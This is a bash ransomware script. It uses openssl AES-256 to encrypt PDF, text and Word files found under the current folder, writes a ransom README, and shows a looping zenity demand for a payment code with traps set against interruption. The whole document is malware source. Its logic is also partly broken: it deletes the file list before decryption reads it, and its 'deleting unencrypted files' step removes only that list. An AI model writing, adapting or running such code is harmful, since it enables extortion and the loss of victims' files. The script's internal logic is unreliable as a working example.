#!/bin/bash

# AES-256 cryption
openssl enc -aes-256-cbc -salt -in $1 -out encrypted.enc

# Listing files in target folder
find . -name "*.pdf" -o -name "*txt" -o -name "*doc" -o -name "*docx" > file_list.txt

# Encrypting the files in folder
cat file_list.txt | while read line; do 

    openssl aes-256-cbc -salt -in "$line" -out "`echo $line | sed 's/\//-/'`"

done

# Creating file with the demanded ransom
touch README.txt
echo "All of your files have been encrypted with AES-256. To decrypt your files you must pay the required ransom." > README.txt

# Display a ransom message
zenity --info --title="ATTENTION !" --text=“All of your files have been encrypted with AES-256. To decrypt your files you must pay the required ransom.”

# Deleting the unencrypted files
rm -rf file_list.txt

# Set a trap to prevent the user to close the script
trap "exit" INT TERM
trap "kill 0" EXIT

# Run an infinite loop while asking for payment
while true;
do
    payment_check=$(zenity --title "Ransomware" --entry --text="Enter the payment code")

    if [ $payment_check = "ABC123" ]; then
        break
    else
        zenity --info --title="ERROR" --text="Incorrect Payment Code!"
    fi
done

# Decrypting files
cat file_list.txt | while read line; do

    openssl aes-256-cbc -d -in "`echo $line | sed 's/\//-/'`" -out "$line"
    
done

# Removing encrypted files
rm -rf *.enc

# Removing the ransom message
rm -rf README.txt

# Freeing the trap
trap - INT TERM EXIT
